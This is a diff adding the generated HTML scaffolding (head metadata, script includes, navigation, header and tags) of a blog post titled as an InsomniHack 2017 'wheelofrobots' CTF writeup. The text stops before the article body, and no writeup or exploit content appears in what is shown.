@@ -1,0 +1,1559 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>InsomniHack 2017 wheelofrobots Writeup &middot; Richard&#39;s Blog</title>
+  <meta name="title" content="InsomniHack 2017 wheelofrobots Writeup &middot; Richard&#39;s Blog" />
+  
+  <meta name="description" content="a description" />
+  <meta name="keywords" content="ctf, pwn, " />
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/1750980453929-insomnihack-2017-wheelofrobots-writeup/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.e4a694b744929a759a0c151321fd6ff5de4ee3b4bfe86bbcbc00eca8690e25cc68e0a260316dcec6b6b419ada9c851205633ce9ff6bc7c630088b448f3320ba7.css"
+    integrity="sha512-5KaUt0SSmnWaDBUTIf1v9d5O47S/6Gu8vADsqGkOJcxo4KJgMW3Oxra0Ga2pyFEgVjPOn/a8fGMAiLRI8zILpw==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.dc15078f1fe553ce354f85ec1bfce7ded8b4060d4124a49b19e31dd64345b8d8f03edbbb1b681748650181f9d81da9728ca10c2b9cb2ae7bf8983d4b669ba876.js"
+    integrity="sha512-3BUHjx/lU841T4XsG/zn3ti0Bg1BJKSbGeMd1kNFuNjwPtu7G2gXSGUBgfnYHalyjKEMK5yyrnv4mD1LZpuodg==" data-copy="Copy" data-copied="Copied"></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.f592a181a15d2a5b042daa7f746c3721acf9063f8b6acd175d989129865a37d400ae0e85b640f9ad42cd98d1f8ad30931718cf8811abdcc5fcb264400d1a2b0c.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj&#43;Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/1750980453929-insomnihack-2017-wheelofrobots-writeup/">
+  <meta property="og:site_name" content="Richard&#39;s Blog">
+  <meta property="og:title" content="InsomniHack 2017 wheelofrobots Writeup">
+  <meta property="og:description" content="a description">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-10T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Pwn">
+    <meta property="og:image" content="http://localhost:1313/posts/1750980453929-insomnihack-2017-wheelofrobots-writeup/featured.jpg">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/1750980453929-insomnihack-2017-wheelofrobots-writeup/featured.jpg">
+  <meta name="twitter:title" content="InsomniHack 2017 wheelofrobots Writeup">
+  <meta name="twitter:description" content="a description">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "InsomniHack 2017 wheelofrobots Writeup",
+    "headline": "InsomniHack 2017 wheelofrobots Writeup",
+    "description": "a description",
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/1750980453929-insomnihack-2017-wheelofrobots-writeup\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Richard Guizar"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-01-10T00:00:00\u002b00:00",
+    "datePublished": "2025-01-10T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-01-10T00:00:00\u002b00:00",
+    
+    "keywords": ["ctf","pwn"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3356"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Richard Guizar" />
+  
+  
+  
+  
+  <link href="https://github.com/r-guizar" rel="me" />
+  
+  
+  
+  
+  <link href="https://www.linkedin.com/in/richard-guizar-2830072a3/" rel="me" />
+  
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+  
+  
+  
+  <meta name="theme-color"/>
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
+      >
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-index-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 padding-main-menu">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Richard&rsquo;s Blog</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a
+  href="/posts/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Posts">
+    Posts
+  </p>
+</a>
+
+
+
+            
+            
+  <a
+  href="https://github.com/r-guizar"
+  target="_blank"
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+    <span >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+    </span>
+  
+  <p class="text-base font-medium" title="">
+    
+  </p>
+</a>
+
+
+
+            
+            
+  <a
+  href="https://www.linkedin.com/in/richard-guizar-2830072a3/"
+  target="_blank"
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+    <span >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+    </span>
+  
+  <p class="text-base font-medium" title="">
+    
+  </p>
+</a>
+
+
+
+            
+            
+  <a
+  href=""
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="">
+    
+  </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 padding-top-[5px]">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Posts">
+      Posts
+    </p>
+  </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+  <a
+    href="https://github.com/r-guizar"
+    
+      target="_blank"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+      <div >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+      </div>
+    
+    <p class="text-bg font-bg" title="">
+      
+    </p>
+  </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+  <a
+    href="https://www.linkedin.com/in/richard-guizar-2830072a3/"
+    
+      target="_blank"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+      <div >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+      </div>
+    
+    <p class="text-bg font-bg" title="">
+      
+    </p>
+  </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+  <a
+    href=""
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="">
+      
+    </p>
+  </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.4812321520cc2e4cd52bf9137015a55bb6c0b5e66a6b2c96b8654c0ec99be59e8e6425dd838a6fd9bac54000586f37f4a9680bbefaa2aee4601a69e188005cf6.js"
+  integrity="sha512-SBIyFSDMLkzVK/kTcBWlW7bAteZqayyWuGVMDsmb5Z6OZCXdg4pv2brFQABYbzf0qWgLvvqiruRgGmnhiABc9g=="
+  data-target-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+
+
+  <article>
+    
+      
+      
+      
+      
+        
+    
+      <div
+        class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom"
+        style="background-image:url(/posts/1750980453929-insomnihack-2017-wheelofrobots-writeup/featured_hu_b955ed038eb5ac58.jpg);"></div>
+    
+  
+      
+    
+
+
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
+      >Richard&#39;s Blog</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/1750980453929-insomnihack-2017-wheelofrobots-writeup/"
+      >InsomniHack 2017 wheelofrobots Writeup</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        InsomniHack 2017 wheelofrobots Writeup
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-01-10T00:00:00&#43;00:00">10 January 2025</time><span class="px-2 text-primary-500">&middot;</span>
+
+
+
+<script
+  type="text/javascript"
+  src="/js/zen-mode.min.2a0a1375509c03daf41c53a9831aa2d560895b7a2528c3eb3b56e7b11a135c7529e49727162a053b6193be8340270a8342f42c69f3d7e262ae54bc248eaac8f5.js"
+  integrity="sha512-KgoTdVCcA9r0HFOpgxqi1WCJW3olKMPrO1bnsRoTXHUp5JcnFioFO2GTvoNAJwqDQvQsafPX4mKuVLwkjqrI9Q=="></script>
+
+<span class="mb-[2px]">
+  <span
+    id="zen-mode-button"
+    class="text-lg hover:text-primary-500"
+    title="Enable zen mode"
+    data-title-i18n-disable="Enable zen mode"
+    data-title-i18n-enable="Disable zen mode">
+    <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg>
+  </span>
+
+</span>
+  </span>
+</span>
+
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/ctf/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ctf
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 margin-top-[0.5rem]"
+                onclick="window.open(&#34;/tags/pwn/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Pwn
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+        
+
+        
+
+        
+
+      
+
+    </header>
+
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+          <div
